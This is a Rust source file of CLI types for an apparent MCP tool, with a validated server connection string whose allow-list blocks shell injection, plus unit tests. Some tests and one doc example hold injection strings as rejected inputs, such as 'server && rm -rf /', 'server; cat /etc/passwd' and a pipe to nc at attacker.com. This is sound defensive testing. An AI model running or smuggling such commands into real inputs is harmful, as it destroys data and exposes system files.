//! CLI-specific types and utilities.
//!
//! This module provides strong types for CLI concepts following Microsoft Rust
//! Guidelines, ensuring type safety and clear intent throughout the CLI codebase.
//!
//! # Design Principles
//!
//! - Strong types over primitives (no raw strings/ints for domain concepts)
//! - All types are `Send + Sync + Debug`
//! - Validation at construction boundaries
//! - User-friendly error messages
//!
//! # Examples
//!
//! ```
//! use mcp_core::cli::{OutputFormat, ExitCode, ServerConnectionString};
//! use std::path::PathBuf;
//!
//! // Output format selection
//! let format = OutputFormat::Pretty;
//! assert_eq!(format.as_str(), "pretty");
//!
//! // Exit codes with semantic meaning
//! let code = ExitCode::SUCCESS;
//! assert_eq!(code.as_i32(), 0);
//!
//! // Validated server connection strings
//! let conn = ServerConnectionString::new("github").unwrap();
//! assert_eq!(conn.as_str(), "github");
//! ```

use std::fmt;
use std::str::FromStr;

/// CLI output format.
///
/// Determines how command results are formatted for user display.
/// All formats provide the same information but with different presentation.
///
/// # Examples
///
/// ```
/// use mcp_core::cli::OutputFormat;
///
/// let format = OutputFormat::Json;
/// assert_eq!(format.as_str(), "json");
///
/// let format: OutputFormat = "pretty".parse().unwrap();
/// assert_eq!(format, OutputFormat::Pretty);
/// ```
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Default)]
pub enum OutputFormat {
    /// JSON output for machine parsing
    Json,
    /// Plain text output for scripts
    Text,
    /// Pretty-printed output with colors for human reading
    #[default]
    Pretty,
}

impl OutputFormat {
    /// Returns the string representation of the format.
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_core::cli::OutputFormat;
    ///
    /// assert_eq!(OutputFormat::Json.as_str(), "json");
    /// assert_eq!(OutputFormat::Text.as_str(), "text");
    /// assert_eq!(OutputFormat::Pretty.as_str(), "pretty");
    /// ```
    #[must_use]
    pub const fn as_str(&self) -> &'static str {
        match self {
            Self::Json => "json",
            Self::Text => "text",
            Self::Pretty => "pretty",
        }
    }
}

impl fmt::Display for OutputFormat {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.as_str())
    }
}

impl FromStr for OutputFormat {
    type Err = crate::Error;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_lowercase().as_str() {
            "json" => Ok(Self::Json),
            "text" => Ok(Self::Text),
            "pretty" => Ok(Self::Pretty),
            _ => Err(crate::Error::InvalidArgument(format!(
                "invalid output format: '{s}' (expected: json, text, or pretty)"
            ))),
        }
    }
}

/// CLI exit code with semantic meaning.
///
/// Provides type-safe exit codes following Unix conventions.
/// Success is 0, errors are non-zero with specific meanings.
///
/// # Examples
///
/// ```
/// use mcp_core::cli::ExitCode;
///
/// let code = ExitCode::SUCCESS;
/// assert_eq!(code.as_i32(), 0);
/// assert!(code.is_success());
///
/// let code = ExitCode::from_i32(1);
/// assert!(!code.is_success());
/// ```
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub struct ExitCode(i32);

impl ExitCode {
    /// Successful execution (exit code 0).
    pub const SUCCESS: Self = Self(0);

    /// General error (exit code 1).
    pub const ERROR: Self = Self(1);

    /// Invalid input or arguments (exit code 2).
    pub const INVALID_INPUT: Self = Self(2);

    /// Server connection or communication error (exit code 3).
    pub const SERVER_ERROR: Self = Self(3);

    /// Execution timeout or resource limit exceeded (exit code 4).
    pub const TIMEOUT: Self = Self(4);

    /// Creates an exit code from an integer value.
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_core::cli::ExitCode;
    ///
    /// let code = ExitCode::from_i32(0);
    /// assert_eq!(code, ExitCode::SUCCESS);
    /// ```
    #[must_use]
    pub const fn from_i32(code: i32) -> Self {
        Self(code)
    }

    /// Returns the exit code as an integer.
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_core::cli::ExitCode;
    ///
    /// assert_eq!(ExitCode::SUCCESS.as_i32(), 0);
    /// assert_eq!(ExitCode::ERROR.as_i32(), 1);
    /// ```
    #[must_use]
    pub const fn as_i32(&self) -> i32 {
        self.0
    }

    /// Checks if the exit code represents success.
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_core::cli::ExitCode;
    ///
    /// assert!(ExitCode::SUCCESS.is_success());
    /// assert!(!ExitCode::ERROR.is_success());
    /// ```
    #[must_use]
    pub const fn is_success(&self) -> bool {
        self.0 == 0
    }
}

impl Default for ExitCode {
    fn default() -> Self {
        Self::SUCCESS
    }
}

impl From<ExitCode> for i32 {
    fn from(code: ExitCode) -> Self {
        code.0
    }
}

impl fmt::Display for ExitCode {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}", self.0)
    }
}

/// Validated MCP server connection string.
///
/// Ensures server identifiers are non-empty and contain only valid characters.
/// This prevents command injection and path traversal attacks.
///
/// # Security
///
/// - Rejects empty strings
/// - Rejects strings with null bytes
/// - Trims whitespace
///
/// # Examples
///
/// ```
/// use mcp_core::cli::ServerConnectionString;
///
/// let conn = ServerConnectionString::new("github").unwrap();
/// assert_eq!(conn.as_str(), "github");
///
/// // Empty strings are rejected
/// assert!(ServerConnectionString::new("").is_err());
///
/// // Whitespace is trimmed
/// let conn = ServerConnectionString::new("  server  ").unwrap();
/// assert_eq!(conn.as_str(), "server");
/// ```
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub struct ServerConnectionString(String);

impl ServerConnectionString {
    /// Creates a new validated server connection string.
    ///
    /// # Security
    ///
    /// This function validates input to prevent command injection attacks:
    /// - Only allows alphanumeric characters and `-_./:` for safe server identifiers
    /// - Rejects shell metacharacters (`&`, `|`, `;`, `$`, `` ` ``, etc.)
    /// - Rejects control characters to prevent CRLF injection
    /// - Length limited to 256 characters
    ///
    /// # Errors
    ///
    /// Returns an error if:
    /// - The string is empty after trimming
    /// - The string contains invalid characters
    /// - The string contains control characters
    /// - The string exceeds 256 characters
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_core::cli::ServerConnectionString;
    ///
    /// let conn = ServerConnectionString::new("my-server")?;
    /// assert_eq!(conn.as_str(), "my-server");
    ///
    /// // Shell metacharacters are rejected for security
    /// assert!(ServerConnectionString::new("server && rm -rf /").is_err());
    /// # Ok::<(), mcp_core::Error>(())
    /// ```
    pub fn new(s: impl Into<String>) -> crate::Result<Self> {
        // Define allowed characters: alphanumeric, hyphen, underscore, dot, slash, colon
        // This prevents command injection while allowing common server identifiers
        const ALLOWED_CHARS: &str =
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_./:";

        let s = s.into();

        // Check for control characters BEFORE trimming to prevent CRLF injection
        if s.chars().any(|c| c.is_control() && c != ' ') {
            return Err(crate::Error::InvalidArgument(
                "server connection string cannot contain control characters".to_string(),
            ));
        }

        let trimmed = s.trim();

        if trimmed.is_empty() {
            return Err(crate::Error::InvalidArgument(
                "server connection string cannot be empty".to_string(),
            ));
        }

        // Reject shell metacharacters to prevent command injection
        if !trimmed.chars().all(|c| ALLOWED_CHARS.contains(c)) {
            return Err(crate::Error::InvalidArgument(
                "server connection string contains invalid characters (allowed: a-z, A-Z, 0-9, -, _, ., /, :)".to_string(),
            ));
        }

        if trimmed.len() > 256 {
            return Err(crate::Error::InvalidArgument(
                "server connection string too long (max 256 characters)".to_string(),
            ));
        }

        Ok(Self(trimmed.to_string()))
    }

    /// Returns the connection string as a string slice.
    ///
    /// # Examples
    ///
    /// ```
    /// use mcp_core::cli::ServerConnectionString;
    ///
    /// let conn = ServerConnectionString::new("server")?;
    /// assert_eq!(conn.as_str(), "server");
    /// # Ok::<(), mcp_core::Error>(())
    /// ```
    #[must_use]
    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl fmt::Display for ServerConnectionString {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}", self.0)
    }
}

impl FromStr for ServerConnectionString {
    type Err = crate::Error;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        Self::new(s)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // OutputFormat tests
    #[test]
    fn test_output_format_as_str() {
        assert_eq!(OutputFormat::Json.as_str(), "json");
        assert_eq!(OutputFormat::Text.as_str(), "text");
        assert_eq!(OutputFormat::Pretty.as_str(), "pretty");
    }

    #[test]
    fn test_output_format_default() {
        assert_eq!(OutputFormat::default(), OutputFormat::Pretty);
    }

    #[test]
    fn test_output_format_from_str_valid() {
        assert_eq!("json".parse::<OutputFormat>().unwrap(), OutputFormat::Json);
        assert_eq!("text".parse::<OutputFormat>().unwrap(), OutputFormat::Text);
        assert_eq!(
            "pretty".parse::<OutputFormat>().unwrap(),
            OutputFormat::Pretty
        );

        // Case insensitive
        assert_eq!("JSON".parse::<OutputFormat>().unwrap(), OutputFormat::Json);
        assert_eq!("TEXT".parse::<OutputFormat>().unwrap(), OutputFormat::Text);
        assert_eq!(
            "PRETTY".parse::<OutputFormat>().unwrap(),
            OutputFormat::Pretty
        );
    }

    #[test]
    fn test_output_format_from_str_invalid() {
        assert!("invalid".parse::<OutputFormat>().is_err());
        assert!("".parse::<OutputFormat>().is_err());
        assert!("xml".parse::<OutputFormat>().is_err());
    }

    #[test]
    fn test_output_format_display() {
        assert_eq!(OutputFormat::Json.to_string(), "json");
        assert_eq!(OutputFormat::Text.to_string(), "text");
        assert_eq!(OutputFormat::Pretty.to_string(), "pretty");
    }

    // ExitCode tests
    #[test]
    fn test_exit_code_constants() {
        assert_eq!(ExitCode::SUCCESS.as_i32(), 0);
        assert_eq!(ExitCode::ERROR.as_i32(), 1);
        assert_eq!(ExitCode::INVALID_INPUT.as_i32(), 2);
        assert_eq!(ExitCode::SERVER_ERROR.as_i32(), 3);
        assert_eq!(ExitCode::TIMEOUT.as_i32(), 4);
    }

    #[test]
    fn test_exit_code_from_i32() {
        assert_eq!(ExitCode::from_i32(0), ExitCode::SUCCESS);
        assert_eq!(ExitCode::from_i32(1), ExitCode::ERROR);
        assert_eq!(ExitCode::from_i32(42).as_i32(), 42);
    }

    #[test]
    fn test_exit_code_is_success() {
        assert!(ExitCode::SUCCESS.is_success());
        assert!(!ExitCode::ERROR.is_success());
        assert!(!ExitCode::INVALID_INPUT.is_success());
        assert!(!ExitCode::from_i32(42).is_success());
    }

    #[test]
    fn test_exit_code_default() {
        assert_eq!(ExitCode::default(), ExitCode::SUCCESS);
    }

    #[test]
    fn test_exit_code_into_i32() {
        let code = ExitCode::ERROR;
        let value: i32 = code.into();
        assert_eq!(value, 1);
    }

    #[test]
    fn test_exit_code_display() {
        assert_eq!(ExitCode::SUCCESS.to_string(), "0");
        assert_eq!(ExitCode::ERROR.to_string(), "1");
    }

    // ServerConnectionString tests
    #[test]
    fn test_server_connection_string_valid() {
        let conn = ServerConnectionString::new("github").unwrap();
        assert_eq!(conn.as_str(), "github");

        let conn = ServerConnectionString::new("my-server-123").unwrap();
        assert_eq!(conn.as_str(), "my-server-123");
    }

    #[test]
    fn test_server_connection_string_trims_whitespace() {
        let conn = ServerConnectionString::new("  server  ").unwrap();
        assert_eq!(conn.as_str(), "server");

        // Control characters (other than space) are rejected before trimming
        assert!(ServerConnectionString::new("\tserver\n").is_err());
    }

    #[test]
    fn test_server_connection_string_rejects_empty() {
        assert!(ServerConnectionString::new("").is_err());
        assert!(ServerConnectionString::new("   ").is_err());
        assert!(ServerConnectionString::new("\t\n").is_err());
    }

    #[test]
    fn test_server_connection_string_from_str() {
        let conn: ServerConnectionString = "server".parse().unwrap();
        assert_eq!(conn.as_str(), "server");

        assert!("".parse::<ServerConnectionString>().is_err());
    }

    #[test]
    fn test_server_connection_string_display() {
        let conn = ServerConnectionString::new("test-server").unwrap();
        assert_eq!(conn.to_string(), "test-server");
    }

    // Security tests for command injection prevention
    #[test]
    fn test_server_connection_string_command_injection() {
        // Shell metacharacters should be rejected
        assert!(ServerConnectionString::new("server && rm -rf /").is_err());
        assert!(ServerConnectionString::new("server; cat /etc/passwd").is_err());
        assert!(ServerConnectionString::new("server | nc attacker.com").is_err());
        assert!(ServerConnectionString::new("server $(malicious)").is_err());
        assert!(ServerConnectionString::new("server `whoami`").is_err());
        assert!(ServerConnectionString::new("server & background").is_err());
    }

    #[test]
    fn test_server_connection_string_control_chars() {
        // Control characters should be rejected (CRLF injection)
        assert!(ServerConnectionString::new("server\r\n").is_err());
        assert!(ServerConnectionString::new("server\0").is_err());
        assert!(ServerConnectionString::new("server\t").is_err());
    }

    #[test]
    fn test_server_connection_string_valid_chars() {
        // These should still be valid
        assert!(ServerConnectionString::new("github").is_ok());
        assert!(ServerConnectionString::new("my_server").is_ok());
        assert!(ServerConnectionString::new("server-123").is_ok());
        assert!(ServerConnectionString::new("localhost:8080").is_ok());
        assert!(ServerConnectionString::new("example.com/path").is_ok());
    }

    #[test]
    fn test_server_connection_string_length_limit() {
        // 256 characters should be allowed
        let valid = "a".repeat(256);
        assert!(ServerConnectionString::new(&valid).is_ok());

        // 257 characters should be rejected
        let too_long = "a".repeat(257);
        assert!(ServerConnectionString::new(&too_long).is_err());
    }
}
